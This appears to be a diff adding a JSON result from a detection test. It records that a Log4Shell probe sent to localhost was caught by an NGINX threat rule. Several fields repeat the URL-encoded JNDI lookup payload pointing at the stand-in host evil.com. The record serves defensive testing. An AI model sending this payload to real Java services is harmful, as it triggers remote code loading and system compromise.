@@ -1,0 +1,17 @@
+{
+  "pattern_id": "SSTI_LOG4S_001",
+  "test_id": "SSTI_LOG4S_001-1772266827303-4jn1qd",
+  "category": "ssti",
+  "detected": true,
+  "expected_detection": true,
+  "latency_ms": 51000,
+  "evidence": "08:20:27.000000000: Critical [NGINX Emerging Threat] Log4Shell attack test_id=SSTI_LOG4S_001-1772266827303-4jn1qd pattern_id=SSTI_LOG4S_001 uri=/?q=%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fexploit%7D client=127.0.0.1",
+  "rule_name": "[NGINX Emerging Threat] Log4Shell attack test_id=SSTI_LOG4S_001-1772266827303-4jn1qd pattern_id=SSTI_LOG4S_001 uri=/?q=%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fexploit%7D client=127.0.0.1",
+  "expected_rule": "[NGINX Emerging Threat] Log4Shell attack",
+  "rule_id": "",
+  "rule_match": true,
+  "matched_rule": "[NGINX Emerging Threat] Log4Shell attack test_id=SSTI_LOG4S_001-1772266827303-4jn1qd pattern_id=SSTI_LOG4S_001 uri=/?q=%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fexploit%7D client=127.0.0.1",
+  "sent_at": 1772266878000,
+  "detected_at": 1772266827000,
+  "status": "passed"
+}
